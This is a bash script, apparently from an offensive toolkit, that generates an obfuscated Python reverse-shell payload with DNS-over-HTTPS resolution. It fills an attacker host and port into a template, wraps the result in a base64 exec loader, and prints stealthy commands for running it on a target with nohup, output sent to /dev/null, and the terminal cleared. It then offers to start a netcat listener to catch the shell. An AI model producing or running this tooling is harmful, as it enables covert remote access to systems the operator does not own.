#!/bin/bash
cat banner.txt
echo "[i] Generate cmd/unix/reverse_python payloads with DNS over HTTPS resolution : "
echo ""
read -p "[*] LHOST       >>> " host
read -p "[*] LPORT       >>> " port
sed "s/REPL_HOST/$host/g" template.py > payload.py
sed -i "s/REPL_PORT/$port/g" payload.py
payload=$(cat payload.py | base64 -w0)
read -p "[*] PAYLOAD NAME       >>> " name
echo "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('$payload')[0]))" > $name.py
echo ""
echo "[+] Transfer $name.py to the target and execute it using python:"
echo "..."
echo 'nohup python '"$name.py"' &>/dev/null & clear && exit'
echo "..."
echo ""
echo "    OR"
echo ""
echo "[+] Execute the following on the target :"
echo "..."
echo -n 'nohup python -c "'
echo -n "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('$payload')[0]))"
echo '" &>/dev/null & clear && exit'
echo "..."
echo ""
read -p "Do want to start netcat listener right away? (y/n) : " answer
if [ $answer = "y" ]
then
  sudo nc -nlvp $port
fi
rm -rf ./payload.py
echo "Have a good day :)"
